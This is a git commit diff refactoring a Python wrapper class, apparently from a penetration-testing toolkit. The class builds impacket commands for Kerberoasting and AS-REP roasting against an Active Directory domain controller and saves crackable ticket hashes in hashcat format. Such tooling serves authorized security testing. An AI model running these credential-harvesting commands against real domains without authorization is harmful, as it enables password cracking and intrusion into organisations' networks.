a2c9941014d642483a38a846b61a6cddcd713e84
James King <pineappleboots@gmail.com>
2025-04-16 02:48:24 -0400

    Update kerberosattacker.py

--- utils/kerberosattacker.py
+++ utils/kerberosattacker.py
@@ -3,6 +3,7 @@
 import subprocess
 import logging
 
+
 class KerberosAttacker:
     '''Kerberos attack class wrapper'''
     
@@ -54,9 +55,8 @@ class KerberosAttacker:
             
         return tools_available
     
-    def kerberoast(self, output_file=None):
-        '''Perform Kerberoasting attack against domain'''
-        
+    def get_kerberoast_command(self, output_file=None):
+        '''Get command string for Kerberoasting attack'''
         # Base command
         cmd = f"impacket-GetUserSPNs {self.domain}/{self.auth} -dc-ip {self.dc}"
         
@@ -64,6 +64,13 @@ class KerberosAttacker:
         if output_file:
             cmd += f" -request -outputfile {output_file}"
             
+        return cmd
+    
+    def kerberoast(self, output_file=None):
+        '''Perform Kerberoasting attack against domain'''
+        
+        # Get command
+        cmd = self.get_kerberoast_command(output_file)
         cmdlst = cmd.split(' ')
         
         try:
@@ -82,9 +89,8 @@ class KerberosAttacker:
             
             return proc.stdout
     
-    def asreproast(self, output_file=None):
-        '''Perform AS-REP Roasting attack against domain'''
-        
+    def get_asreproast_command(self, output_file=None):
+        '''Get command string for AS-REP Roasting attack'''
         # Base command with domain and auth
         if self.user_file:
             cmd = f"impacket-GetNPUsers {self.domain}/ -usersfile {self.user_file} -dc-ip {self.dc}"
@@ -95,6 +101,13 @@ class KerberosAttacker:
         if output_file:
             cmd += f" -format hashcat -outputfile {output_file}"
             
+        return cmd
+    
+    def asreproast(self, output_file=None):
+        '''Perform AS-REP Roasting attack against domain'''
+        
+        # Get command
+        cmd = self.get_asreproast_command(output_file)
         cmdlst = cmd.split(' ')
         
         try:
